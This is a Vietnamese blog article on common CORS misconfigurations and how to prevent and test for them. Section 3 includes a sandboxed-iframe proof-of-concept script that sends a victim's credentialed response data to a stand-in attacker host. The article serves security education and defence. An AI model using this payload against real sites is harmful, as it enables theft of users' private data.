![](https://images.viblo.asia/c4613ce2-f8f3-4ff3-b950-682e336bb58f.png)


## I. Các khái niệm chung
Đối với developer, việc sử dụng CORS để chia sẻ tài nguyên giữa các domain là công việc hết sức bình thường, nhưng không phải ai cũng biết cách để ứng dụng CORS cho an toàn. CORS cho phép chúng ta chia sẻ các tài nguyên dễ dàng nhưng cũng đồng thời là nơi để kẻ tấn công có thể khai thác nếu như cấu hình không thực sự tốt. Trước khi đi vào chi tiết về các lỗ hổng, mình xin phép điểm qua hai khai niệm cơ bản khi nhắc tới CORS.

### 1. Same Origin Policy
Same Origin Policy (SOP) là chính sách được tạo ra nhằm tăng tính bảo mật của website, thông qua việc giới hạn truy cập tới tài nguyên của trang web trong phạm vi các trang cùng domain. Việc này giúp tăng tính bảo mật thông tin cho trang web, hạn chế các script từ các trang web khác tấn công. Tuy nhiên việc sử dụng SOP cũng có một hạn chế là gây khó khăn cho việc chia sẻ tài nguyên giữa các trang web không nằm cùng một domain. Điều này dẫn tới sự ra đời của khái niệm tiếp theo, thứ mà mình sẽ phân tích trong bài viết này: Cross Origin Resource Sharing (CORS)

### 2. Cross Origin Resource Sharing
Giống như cái tên của mình, Cross Origin Resource Sharing (CORS) là một kĩ thuật để cho phép các trang web khác domain có thể chia sẻ tài nguyên với nhau thông qua các headers. Browser sẽ sử dụng các header này để xem tài  nguyên có được truy cập tới hay không. 

Chi tiết  về SOP và CORS có thể tham khảo theo bài viết: [CORS](https://viblo.asia/p/cors-jvElaBNd5kw) . Trong bài viết này, mình xin được nói ngắn gọn để tập trung việc phân tích các lỗi thường gặp khi cấu hình CORS trên website.

## II. Các lỗ hổng thường thấy trong cấu hình CORS
![](https://images.viblo.asia/b517bc94-ee22-45db-9132-df45106a3c0e.png)


### 1. Response header được tạo theo origin header gửi lên từ client
Việc duy trì một whitelist lớn cho các domain đôi khi rất tốn kém và khó khăn, cũng như việc nếu có bất cứ một lỗi nào cũng có thể làm ảnh hưởng đến chức năng của hệ thống. Thế nên, nhiều developer chọn cho mình các dễ dàng là lấy luôn origin header được gửi từ client làm Access-Control-Allow-Origin header trong response. Việc này đồng nghĩa với việc bất cứ domain nào chỉ cần gửi kèm một header origin là có thể truy cập tới tài nguyên. Lỗi này thường ít gặp nhưng nếu gặp lại rất nguy hiểm vì nếu response gửi về kèm theo các thông tin  nhạy cảm sẽ dễ dàng bị lộ ra chỉ với một thao tác đơn giản.
Ví dụ: trang web này gửi 1 request để lấy thông tin của người dùng, một request thông thường sẽ nhận được response như hình dưới
![](https://images.viblo.asia/9fd6cffa-2980-4e55-bf12-54854196a7d9.png)

Tuy nhiên, trang web này không xác thực origin của request, nên khi thêm bất kì origin nào vào request cũng được accept:
![](https://images.viblo.asia/f638fbdb-5eb4-4f9b-b420-f1c50cf068fb.png)

Như ở ví dụ trên, dù có là domain nào gửi tới cũng sẽ nhận được response accept từ server. Hacker có thể lợi dụng điều này để tạo 1 đoạn script để lấy được thông tin của bất cứ người dùng nào của trang trên khi truy cập vào web của hắn: 
![](https://images.viblo.asia/b1fe1fb5-0102-4e5b-99ac-4d36c3173ee0.png)

Mọi request sẽ ghi vào log và hacker có thể lấy được thông tin mà hắn muốn:
![](https://images.viblo.asia/f1abf7ac-1201-401c-88c0-2ac1ff7a6e93.png)

Decode nhẹ nhàng với url decoder là sẽ có được thông tin trắng của người dùng.
![](https://images.viblo.asia/5bb0cbe8-8c79-4a4f-b448-968edb4b9b35.png)

Từ thông tin này, hacker có thể tiến hành các tấn công xa hơn như thay đổi email, mật khẩu...


### 2. Phân tích thiếu chặt chẽ Origin Header
Thông thường, các website sẽ có một whitelist các domain được phép truy cập cùng các subdomain. Việc xác thực thường thông qua các prefix, postfix hay regex để kiểm tra origin header gửi lên có nằm trong whitelist hay không. Nếu cấu hình việc xác thực thiếu chặt chẽ, kẻ tấn công có thể bypass được và lấy được các thông tin nhạy cảm.

Ví dụ: Một website A cho phép các request từ domain "innocent-website.com" truy cập tới tài nguyên. Gói tin "sạch" gửi lên sẽ có dạng:

![](https://images.viblo.asia/c5389699-4351-4300-bc15-7ed7f73db50f.png)

và response trả về sẽ có dạng: 

![](https://images.viblo.asia/ccdd3a05-6a1d-4c4b-8a7c-a7f9b0fad4cf.png)


Tuy nhiên, việc kiểm tra trên server lại chỉ kiểm tra origin header có chứa "normal-website.com" hay không. Nên nếu hacker sử dụng một domain như "maliciousinnocent-website.com" thì vẫn có thể lấy được data.

![](https://images.viblo.asia/fb73589e-675f-405c-b032-2ba3ac14a7b5.png)


Lỗi này tương đối phổ biến do việc cấu hình xác thực thiếu chặt chẽ vì tin tưởng vào header được người dùng gửi lên. Tuy lỗi này khó phát hiện hơn nhưng nếu có cũng dễ dàng giúp kẻ tấn công có thể lấy được thông tin.
    
### 3. Chấp nhận giá trị null của origin header
Đôi khi, để giúp cho việc local development được dễ dàng, nhiều ứng dụng sẽ cho phép giá trị null của origin header trong whitelist. Trong trường hợp này, kẻ tấn công có thể dùng một số mẹo để tạo ra giá trị null cho origin header để có thể lấy được thông tin. Ví dụ như sử dụng đoạn script tạo request từ một sandboxed iframe sau; 
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script><br>
var req = new XMLHttpRequest();<br>
req.onload = reqListener;<br>
req.open('get','vulnerable-website.com/sensitive-victim-data',true);<br>
req.withCredentials = true;<br>
req.send();<br>
<br>
function reqListener() {<br>
location='malicious-website.com/log?key='+this.responseText;<br>
};<br>
</script>"><br></iframe>
```

Đoạn script này sẽ gửi lên request với origin header có giá trị null lên server và vì giá trị null được whitelist, kẻ tấn công sẽ có thể lấy ra được thông tin nhạy cảm hắn muốn.

### 4. Khai thác CORS thông qua XSS từ các domain được whitelist
Trang web của bạn có cấu hình cẩn thận, validate mọi thứ hoàn hảo và bạn nghĩ sẽ không thể bị khai thác thông tin qua CORS? Chưa chắc đâu! 

Ví dụ như hình dưới đây ![](https://images.viblo.asia/d1cd558c-1003-46d6-8b23-3feb6aa79a9a.png)

Cam có một trang web sử dụng CORS, được cấu hình cẩn thận. Trong whitelist của Cam có anh bạn Quýt. Không may Quýt có lỗi XSS, thế là hacker lợi dụng web của Quýt gửi tới trang của Cam, Cam thì tin tưởng bạn mình nên là gửi trả lại data và hacker nghiễm nhiên lấy được nó.



### 5. Thiếu bảo mật với các domain nội bộ
Một tình huống khác cũng khá phổ biến trong cấu hình CORS là việc kiểm tra xác thực được thực hiện chặt chẽ với các domain bên ngoài, nhưng lại không có xác thực với các domain nội bộ. Trong trường hợp này, tuy kẻ tấn công không thể truy cập tới dữ liệu cách trực tiếp, hắn có thể sử dụng một vài các kĩ thuật để giả mạo request hoặc tạo request từ một domain trong mạng nội bộ với domain mục tiêu. Tuy có khó khăn hơn trong thực hiện nhưng kẻ tấn công vẫn có thể đạt được mục đích, thậm chí đi sâu hơn vào hệ thống. Nên là dù là anh em một nhà cũng đừng tin tưởng nhau quá nhé.

## III. Phòng tránh bị khai thác CORS như thế nào?
Trên đây mình đã chỉ ra 5 lỗ hổng thông thường trong việc sử dụng CORS. Ngoài ra, vẫn còn các kịch bản tấn công khác dù hiếm nhưng vẫn có thể gặp mà mình chưa thể liệt kê hết trong bài viết này.

Như người ta vẫn nói: "phòng bệnh hơn chữa bệnh", sau đây mình xin đưa ra các giải pháp cho việc phòng tránh tấn công CORS sao cho hiệu quả:

### 1. Cấu hình CORS cẩn thận
Nếu trang web có chứa các thông tin nhạy cảm, hãy chắc chắn rằng CORS được cấu hình cẩn thận và xác thực đầy đủ.
### 2. Chỉ tin tưởng các domain đáng tin cậy
Hạn chế việc whitelist quá nhiều domain mà không biết có thể tin tưởng được hay không. Cũng như chắc chắn mình sẽ không là "quả cam đáng thương" phải đổ vỏ cho thằng Quýt nhé.
### 3. Không sử dụng giá trị null cho origin header
Giá trị null là giá trị nhạy cảm, việc sử dụng có thể dẫn tới các kết quả không mong muốn và là lỗ hổng để kẻ tấn công khai thác. Nên việc không sử dụng sẽ giúp hạn chế nguy cơ bị tấn công đó.
### 4. Áp dụng việc xác thực ngay cả với các domain nội bộ
Anh em trong nhà có khi còn lừa nhau thì mấy cái domain nội bộ cũng vậy thôi. Đừng tin tưởng dù có là domain nội bộ hay bên ngoài, hãy chắc chắn việc xác thực được thực thi với mọi request gửi tới server nhé.
### 5. Nếu có thể hãy sử dụng cookie và TLS để tăng tính bảo mật
Sử dụng cookie và HTTPs sẽ giúp tăng tính bảo mật cho website khi sử dụng CORS. Tuy nhiên, hãy chắc rằng việc sử dụng TLS hay cookie cũng  được kiểm tra kĩ lưỡng nhé.
### 6. Đừng tin bất cứ thứ gì người dùng gửi lên, kể cả mấy cái header
Người dùng là nơi nhiều lỗ hổng nhất trong cấu trúc của hệ thống thông tin. Mọi thứ người dùng gửi lên là không thể đoán trước và bất cứ thứ gì cũng có thể là độc hại và giả mạo. Thế nên hãy chắc chắn việc xác thực ở server được thực hiện một cách thật cẩn thận trước khi chấp thuận một request nào.

## IV. Test CORS như thế nào?
Thông thường khi kiểm tra một website có dính các lỗi liên quan tới CORS hay không, mình thường dùng BurpSuite Repeater để thử thay đổi nội dung của các header, nắm bắt cách CORS của trang đó cấu hình và thử các kịch bản thường gặp.

CORS cũng có thể được phát hiện qua các web vulnerability scanner như Burp 

Ngoài ra, Open Web Application Security Project (OWASP) cũng khuyến nghị 1 tool khá hay để test CORS cho trang web là [OWASP Zed Attack Proxy (ZAP)](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)

## V. Lời kết
CORS là một kĩ thuật quan trọng, được sử dụng phổ biến. Tuy nhiên, việc chia sẻ tài nguyên phải được chú ý cẩn thận, vì biết đâu, chỉ một lỗi nhỏ lại khiến bạn trở thành nạn nhân của một hacker may mắn nào đó.

(Bài viết này được tham khảo và tổng hợp theo [Portswigger](https://portswigger.net/web-security/cors) và [OWASP Testing Guide](https://portswigger.net/web-security/cors))